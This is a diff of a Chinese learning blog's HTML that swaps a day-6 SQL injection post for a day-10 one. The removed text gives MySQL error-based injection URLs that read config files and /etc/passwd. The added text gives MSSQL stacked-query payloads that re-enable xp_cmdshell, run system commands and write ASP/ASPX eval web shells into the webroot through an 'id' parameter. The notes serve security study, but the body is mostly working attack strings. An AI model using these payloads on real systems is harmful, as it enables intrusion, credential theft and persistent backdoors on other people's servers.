@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>web入门SQL注入第六天 | 麟的blog</title>
+  <title>web入门SQL注入第十天 | 麟的blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="主题：报错注入读取文件一、方法1.extractvalue读取文件(32位）eg:http:&#x2F;&#x2F;target_sys.com&#x2F;mysqlinj.php?id&#x3D;-1 and(extractvalue(1,concat(0x7e,(select load_file(‘C:\inetpub\wwwroot\target_sys.com\data\config.inc.php‘)),0x7e))) 2.e">
+  <meta name="description" content="主题：sqlserver执行系统命令在SQLSERVER中是可以执行多行操作的两条SQL语句是用分号隔开select * from art; select * from admin xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure 重新开启它。;EXEC sp_configure ‘sh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web入门SQL注入第六天">
-<meta property="og:url" content="http://example.com/2023/12/01/sql6stday/index.html">
+<meta property="og:title" content="web入门SQL注入第十天">
+<meta property="og:url" content="http://example.com/2023/12/06/sql10thday/index.html">
 <meta property="og:site_name" content="麟的blog">
-<meta property="og:description" content="主题：报错注入读取文件一、方法1.extractvalue读取文件(32位）eg:http:&#x2F;&#x2F;target_sys.com&#x2F;mysqlinj.php?id&#x3D;-1 and(extractvalue(1,concat(0x7e,(select load_file(‘C:\inetpub\wwwroot\target_sys.com\data\config.inc.php‘)),0x7e))) 2.e">
+<meta property="og:description" content="主题：sqlserver执行系统命令在SQLSERVER中是可以执行多行操作的两条SQL语句是用分号隔开select * from art; select * from admin xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure 重新开启它。;EXEC sp_configure ‘sh">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-12-01T08:15:30.000Z">
-<meta property="article:modified_time" content="2023-12-01T09:24:55.847Z">
+<meta property="article:published_time" content="2023-12-06T07:45:00.000Z">
+<meta property="article:modified_time" content="2023-12-06T09:22:23.383Z">
 <meta property="article:author" content="一只麟">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
@@ -80,10 +80,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-sql6stday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-sql10thday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/12/01/sql6stday/" class="article-date">
-  <time class="dt-published" datetime="2023-12-01T08:15:30.000Z" itemprop="datePublished">2023-12-01</time>
+    <a href="/2023/12/06/sql10thday/" class="article-date">
+  <time class="dt-published" datetime="2023-12-06T07:45:00.000Z" itemprop="datePublished">2023-12-06</time>
 </a>
     
   </div>
@@ -94,7 +94,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      web入门SQL注入第六天
+      web入门SQL注入第十天
     </h1>
   
 
@@ -102,14 +102,21 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>主题：报错注入读取文件</strong><br>一、方法<br>1.extractvalue读取文件(32位）<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://target_sys.com/mysqlinj.php?id=-1</a> and(extractvalue(1,concat(0x7e,(select load_file(‘C:\inetpub\wwwroot\target_sys.com\data\config.inc.php‘)),0x7e)))</p>
-<p>2.exp方法读取（没有长度限制)(<strong>推荐方法</strong>）<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=1">http://target_sys.com/mysqlinj.php?id=1</a> and (exp(~(select*from(select load_file(‘&#x2F;etc&#x2F;passwd’))a));</p>
-<p>3.写文件<br><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://target_sys.com/mysqlinj.php?id=-1</a> and exp(~(select*from(select’hello’)a)) into outfile ’C:\inetpub\wwwroot\target_sys.com\data\config.inc.txt’;</p>
+        <p><strong>主题：sqlserver执行系统命令</strong><br>在SQLSERVER中是可以执行多行操作的<br>两条SQL语句是用分号隔开<br>select * from art; select * from admin</p>
+<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。<br>如果用户拥有管理员sa权限则可以用sp_configure 重新开启它。<br>;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
+<p>命令解释<br>EXEC sp_configure ‘show advanced opt- ions’,1&#x2F;&#x2F;允许修改高级参数<br>RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’,1  &#x2F;&#x2F;打开xp_cmdshell扩展RECONFIGURE</p>
+<p>执行系统命令<br>EXEC master.dbo.xp_cmdshell ‘ipconfig’</p>
+<p>开始xp_cmdshell<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
+<p>getshell </p>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master..xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.asp">www.demo1.com\2.asp</a>‘ –  </p>
+<p>exec master..xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.asp'--">www.demo1.com\2.asp&#39;--</a><br>exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],”unsafe”);%^&gt;&gt;D:\2.aspx’ –<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],”unsafe”);%^&gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.aspx">www.demo1.com\2.aspx</a>‘ –</p>
+<p>执行系统命令 把命令结果输出到指定文件<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell ‘ipconfig &gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/ip.txt">www.demo1.com\ip.txt</a>‘</p>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell ‘whoami &gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/ip.txt">www.demo1.com\ip.txt</a>‘</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/01/sql6stday/" data-id="clpml2im8000duocago41a65d" data-title="web入门SQL注入第六天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/12/06/sql10thday/" data-id="cltsm55fu0001foca5mp569oo" data-title="web入门SQL注入第十天" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -121,19 +128,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2023/12/01/sql7stday/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2024/03/15/kali1st/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          web入门SQL注入第七天
+          kali渗透测试学习第一天——信息收集
         
       </div>
     </a>
   
   
-    <a href="/2023/11/30/sql5stday/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/12/01/sql9stday/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">web入门SQL注入第五天</div>
+      <div class="article-nav-title">web入门SQL注入第九天</div>
     </a>
   
 </nav>
